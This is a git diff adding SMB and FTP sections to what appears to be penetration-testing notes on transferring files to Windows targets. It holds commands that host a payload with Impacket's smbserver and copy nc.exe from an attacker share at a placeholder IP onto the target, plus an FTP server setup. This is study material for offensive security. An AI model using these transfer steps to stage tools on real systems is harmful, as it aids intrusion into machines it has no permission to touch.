@@ -53,3 +53,34 @@ Invoke-WebRequest '<Target File URL>' -OutFile '<Output File Location>'
 [More Examples](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
 
 ## SMB Downloads
+SMB works on TCP port 445, and can be used to transfer files to a target system.
+
+First we need to create an SMB server to host our payload (we can use Impacket's `smbserver`)
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+
+We can then copy the file to our target system
+```cmd
+copy \\<ip>\share\nc.exe
+```
+> Sometimes this will be blocked by modern windows systems as guest authentication is disabled. To fix this we can create an SMB server with a username and password.
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+On the target system, mount and then copy the file
+```cmd
+net use n: \\<ip>\share /user:test test
+copy n:\nc.exe
+```
+
+## FTP Downloads
+Another alternative is to use port 20/21 for FTP file downloads.
+
+We can use `pyftpdlib` (a python ftp server library) to create an FTP server. By default it uses port *2121* so we can change this. It also has anonymous auth enabled by default too.
+```bash
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port 21
+```
